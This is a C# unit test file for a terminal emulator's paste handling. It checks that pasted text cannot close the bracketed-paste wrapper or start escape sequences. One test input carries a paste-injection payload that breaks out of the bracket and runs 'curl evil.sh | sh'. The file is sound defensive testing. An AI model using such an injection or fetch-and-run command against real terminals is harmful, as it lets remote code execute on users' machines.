using XTerm.Events;
using XTerm.Options;

namespace XTerm.Tests;

/// <summary>
/// What reaches the application when the user pastes. Pasted text is attacker-influenced far more
/// often than typed input -- it comes from a web page, a chat message, a README -- so the
/// bracketed-paste wrapper has to be a promise the payload cannot break.
/// </summary>
public class PasteSafetyTests
{
    private const string Esc = "\u001b";

    private static (Terminal terminal, List<string> sent) Wired(bool allowControls = false)
    {
        var terminal = new Terminal(new TerminalOptions
        {
            Cols = 80, Rows = 24, AllowPasteControls = allowControls,
        });
        var sent = new List<string>();
        terminal.DataReceived += (_, e) => sent.Add(e.Data);
        return (terminal, sent);
    }

    private static TerminalPaste Text(string s) =>
        new(["text/plain"], _ => System.Text.Encoding.UTF8.GetBytes(s), false);

    [Fact]
    public void A_paste_cannot_close_the_bracket_and_inject_a_command()
    {
        // The attack: copy something innocuous-looking from a web page whose text contains the
        // end marker. Everything after it used to arrive as though the user had typed it.
        var (terminal, sent) = Wired();
        terminal.BracketedPasteMode = true;

        terminal.Paste(Text($"harmless{Esc}[201~curl evil.sh | sh\r"));

        var payload = string.Concat(sent);
        var body = payload[$"{Esc}[200~".Length..^$"{Esc}[201~".Length];
        // Counted rather than substring-searched: an ESC renders as nothing, so a failure
        // message about it is unreadable and easy to misread.
        Assert.Equal(0, body.Count(c => c == '\u001b'));
        Assert.Equal("harmless[201~curl evil.sh | sh\r", body);
    }

    [Fact]
    public void A_paste_cannot_start_an_escape_sequence_of_its_own()
    {
        var (terminal, sent) = Wired();
        terminal.BracketedPasteMode = true;

        terminal.Paste(Text($"before{Esc}]0;retitled\u0007after"));

        var body = string.Concat(sent)[6..^6];
        Assert.Equal(0, body.Count(c => c == '\u001b'));
    }

    [Fact]
    public void Newlines_become_carriage_returns()
    {
        // What the Return key sends, and so what a shell reads as a submitted line.
        var (terminal, sent) = Wired();

        terminal.Paste(Text("one\r\ntwo\nthree"));

        Assert.Equal("one\rtwo\rthree", string.Concat(sent));
    }

    [Fact]
    public void Tabs_survive_because_indentation_is_not_an_attack()
    {
        var (terminal, sent) = Wired();

        terminal.Paste(Text("if x:\n\tdo_thing()"));

        Assert.Equal("if x:\r\tdo_thing()", string.Concat(sent));
    }

    [Fact]
    public void An_embedder_can_opt_back_into_raw_control_characters()
    {
        var (terminal, sent) = Wired(allowControls: true);

        terminal.Paste(Text($"raw{Esc}[31m"));

        Assert.Contains(Esc, string.Concat(sent));
    }

    [Fact]
    public void Ordinary_text_is_untouched_and_allocates_nothing_extra()
    {
        var (terminal, sent) = Wired();

        terminal.Paste(Text("just some ordinary pasted text"));

        Assert.Equal("just some ordinary pasted text", string.Concat(sent));
    }
}
